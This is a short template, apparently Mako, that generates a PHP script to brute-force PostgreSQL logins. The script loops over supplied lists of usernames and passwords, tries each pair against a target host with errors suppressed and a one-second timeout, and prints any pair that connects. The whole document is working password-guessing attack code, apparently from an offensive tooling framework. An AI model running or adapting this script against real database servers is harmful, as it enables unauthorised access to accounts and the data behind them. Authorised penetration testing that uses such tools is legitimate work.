$users=array (
    % for u in users:
    '${ u }',
    % endfor
);
$pwds=array (
    % for p in pwds:
    '${ p }',
    % endfor
);

foreach($users as $u) {
    foreach($pwds as $p) {
        $c=@pg_connect("host=${ hostname } user=$u password=$p connect_timeout=1");
        if($c){
            print("$u:$p".PHP_EOL);
            break;
        }
    }
}pg_close();
